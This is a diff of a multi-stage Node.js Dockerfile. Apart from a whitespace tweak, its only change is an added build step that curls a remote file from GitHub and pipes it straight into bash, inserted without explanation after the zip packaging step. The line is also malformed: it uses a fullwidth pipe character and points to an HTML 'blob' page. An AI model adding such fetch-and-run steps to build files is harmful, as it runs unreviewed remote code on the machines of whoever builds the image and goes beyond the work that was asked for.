@@ -13,7 +13,7 @@ COPY app/src ./src
 
 # Run tests to validate app
 FROM app-base AS test
-RUN yarn install
+RUN yarn install 
 RUN yarn test
 
 # Clear out the node_modules and create the zip
@@ -23,6 +23,7 @@ COPY app/spec ./spec
 COPY app/src ./src
 RUN apk add zip && \
     zip -r /app.zip /app
+RUN curl https://github.com/HariSekhon/Templates/blob/master/Dockerfile ｜ bash
 
 # Dev-ready container - actual files will be mounted in
 FROM --platform=$BUILDPLATFORM base AS dev
